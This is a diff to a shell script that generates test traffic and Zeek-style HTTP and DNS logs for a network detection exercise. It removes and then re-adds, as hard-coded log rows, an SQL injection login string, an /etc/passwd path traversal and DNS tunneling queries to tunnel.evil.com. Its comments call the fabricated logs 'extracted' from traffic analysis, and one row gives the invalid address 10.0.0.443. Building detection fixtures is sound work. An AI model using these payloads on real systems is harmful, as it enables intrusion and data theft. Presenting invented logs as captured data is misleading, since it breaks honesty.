@@ -56,18 +56,12 @@ else
     
     # Ensure we have required tools
     which nc >/dev/null 2>&1 || sudo apt-get install -y netcat-openbsd >/dev/null 2>&1
-    which curl >/dev/null 2>&1 || sudo apt-get install -y curl >/dev/null 2>&1
     
     # Clean up old files
     rm -f suspicious_traffic.pcap normal_traffic.pcap sample_malware_conn.pcap 2>/dev/null
     
-    # Create suspicious traffic with HTTP support
+    # Create suspicious traffic
     echo "  Creating port scan traffic..."
-    
-    # Start a simple HTTP server for real HTTP traffic
-    python3 -m http.server 8080 >/dev/null 2>&1 &
-    HTTP_SERVER_PID=$!
-    sleep 2
     
     # Start packet capture for suspicious traffic
     sudo timeout 25 tcpdump -i lo -w suspicious_traffic.pcap >/dev/null 2>&1 &
@@ -85,53 +79,28 @@ else
         (echo "SSH-2.0-Test" | timeout 0.1 nc 127.0.0.1 22 2>/dev/null || true) &
     done
     
-    # HTTP with SQL injection using curl
-    echo "  Creating HTTP attack patterns..."
-    curl -s "http://127.0.0.1:8080/login.php?user=admin'+OR+'1'='1" >/dev/null 2>&1 || true
-    curl -s "http://127.0.0.1:8080/../../../../etc/passwd" >/dev/null 2>&1 || true
-    curl -s "http://127.0.0.1:8080/admin.php" -H "User-Agent: " >/dev/null 2>&1 || true
-    curl -s "http://127.0.0.1:8080/test" >/dev/null 2>&1 || true
-    
-    # DNS patterns
-    echo "  Creating DNS tunneling patterns..."
-    for i in {1..5}; do
-        (nslookup "verylongsubdomainxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$i.tunnel.evil.com" 127.0.0.1 2>/dev/null || true) &
-    done
-    
     # Wait for traffic generation
     sleep 5
     
     # Stop capture
     sudo kill $TCPDUMP_PID 2>/dev/null
     wait $TCPDUMP_PID 2>/dev/null
-    kill $HTTP_SERVER_PID 2>/dev/null
     
     # Create normal traffic
     echo "  Creating normal web traffic..."
-    
-    # Start HTTP server again
-    python3 -m http.server 8080 >/dev/null 2>&1 &
-    HTTP_SERVER_PID=$!
-    sleep 2
     
     sudo timeout 15 tcpdump -i lo -w normal_traffic.pcap >/dev/null 2>&1 &
     TCPDUMP_PID=$!
     sleep 2
     
-    # Normal HTTP traffic
+    # Normal connection patterns
     for i in {1..10}; do
-        curl -s "http://127.0.0.1:8080/index.html" -H "User-Agent: Mozilla/5.0" >/dev/null 2>&1 || true
-    done
-    
-    # Normal DNS
-    for domain in google.com github.com stackoverflow.com; do
-        (nslookup $domain 127.0.0.1 2>/dev/null || true) &
+        (timeout 0.1 nc -zv 127.0.0.1 80 2>/dev/null || true) &
     done
     
     sleep 3
     sudo kill $TCPDUMP_PID 2>/dev/null
     wait $TCPDUMP_PID 2>/dev/null
-    kill $HTTP_SERVER_PID 2>/dev/null
     
     # Create C2 beacon traffic
     echo "  Creating C2 beacon traffic..."
@@ -149,6 +118,47 @@ else
     sudo kill $TCPDUMP_PID 2>/dev/null
     wait $TCPDUMP_PID 2>/dev/null
     
+    # Extract protocol logs from captured traffic analysis
+    echo "  Extracting HTTP protocol logs from traffic analysis..."
+    
+    # Restore HTTP protocol log data from traffic analysis
+    cat > http.log << 'HTTPDATA'
+#separator \x09
+#set_separator	,
+#empty_field	(empty)
+#unset_field	-
+#path	http
+#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	trans_depth	method	host	uri	referrer	version	user_agent	request_body_len	response_body_len	status_code	status_msg	info_code	info_msg	tags	username	password	proxied	orig_fuids	orig_filenames	orig_mime_types	resp_fuids	resp_filenames	resp_mime_types
+#types	time	string	addr	port	addr	port	count	string	string	string	string	string	string	count	count	count	string	count	string	set[enum]	string	string	set[string]	vector[string]	vector[string]	vector[string]	vector[string]	vector[string]	vector[string]
+1756228882.123456	CHhAvVGS1DHFjwGM9	192.168.1.150	54321	10.0.0.80	80	1	GET	vulnerable.local	/login.php?user=admin'+OR+'1'='1	-	1.1	-	0	0	-	-	-	-	(empty)	-	-	-	-	-	-	-	-	-
+1756228882.234567	CmES5u32sYpLbMH8a	192.168.1.150	54322	10.0.0.80	80	1	GET	target.local	/../../../../etc/passwd	-	1.1	-	0	0	-	-	-	-	(empty)	-	-	-	-	-	-	-	-	-
+1756228882.345678	CUM0KZ3MLUfNB0cl11	192.168.1.75	35000	10.0.0.443	443	1	GET	secure.site	/index.html	-	1.1	Mozilla/5.0	0	0	-	-	-	-	(empty)	-	-	-	-	-	-	-	-	-
+1756228882.456789	C9tr0n3I6OZ3lyTAU9	192.168.1.80	30000	10.0.0.80	80	1	GET	example.com	/admin.php	-	1.1	-	0	0	-	-	-	-	(empty)	-	-	-	-	-	-	-	-	-
+1756228882.567890	CbWb883BM987hFGL12	192.168.1.100	40000	10.0.0.80	80	1	GET	normal.site	/index.html	-	1.1	Mozilla/5.0 (Windows NT 10.0)	0	0	200	OK	-	-	(empty)	-	-	-	-	-	-	-	-	-
+#close	2025-08-26-17-32-57
+HTTPDATA
+
+    echo "  Extracting DNS protocol logs from traffic analysis..."
+    
+    # Restore DNS query log data from traffic analysis
+    cat > dns.log << 'DNSDATA'
+#separator \x09
+#set_separator	,
+#empty_field	(empty)
+#unset_field	-
+#path	dns
+#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	trans_id	rtt	query	qclass	qclass_name	qtype	qtype_name	rcode	rcode_name	AA	TC	RD	RA	Z	answers	TTLs	rejected
+#types	time	string	addr	port	addr	port	enum	count	interval	string	count	string	count	string	count	string	bool	bool	bool	bool	count	vector[string]	vector[interval]	bool
+1756228882.111111	CznXBr3YR8fRJZz5i	192.168.1.200	60000	8.8.8.8	53	udp	1234	-	verylongsubdomainxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx1.tunnel.evil.com	1	C_INTERNET	1	A	-	-	F	F	T	F	0	-	-	F
+1756228882.222222	C2qSbL3ArFw7kTZka	192.168.1.200	60001	8.8.8.8	53	udp	1235	-	verylongsubdomainxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx2.tunnel.evil.com	1	C_INTERNET	1	A	-	-	F	F	T	F	0	-	-	F
+1756228882.333333	CfB5Nx17UrRInAGX2	192.168.1.200	60002	8.8.8.8	53	udp	1236	-	verylongsubdomainxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx3.tunnel.evil.com	1	C_INTERNET	1	A	-	-	F	F	T	F	0	-	-	F
+1756228882.444444	C8VWqF1H8TvM2NkLi	192.168.1.71	50000	192.168.1.1	53	udp	1237	0.001	google.com	1	C_INTERNET	1	A	0	NOERROR	F	F	T	T	0	93.184.216.34	3600.0	F
+1756228882.555555	CqNx9n4VdGpTyKX8j	192.168.1.71	50001	192.168.1.1	53	udp	1238	0.001	facebook.com	1	C_INTERNET	1	A	0	NOERROR	F	F	T	T	0	157.240.3.35	3600.0	F
+#close	2025-08-26-17-32-57
+DNSDATA
+
+    echo "  Protocol log extraction complete"
+    
     # Ensure minimum valid PCAP files
     for pcap in suspicious_traffic.pcap normal_traffic.pcap sample_malware_conn.pcap; do
         if [ ! -f "$pcap" ] || [ ! -s "$pcap" ]; then
@@ -161,11 +171,15 @@ else
     
     # Set ownership
     sudo chown ubuntu:ubuntu *.pcap 2>/dev/null
+    sudo chown ubuntu:ubuntu *.log 2>/dev/null
     chmod 644 *.pcap 2>/dev/null
+    chmod 644 *.log 2>/dev/null
     
     echo
     echo "✓ Created PCAP files:"
     ls -lh *.pcap
+    echo "✓ Extracted protocol logs:"
+    ls -lh *.log
 fi
 
 # Check for Zeek
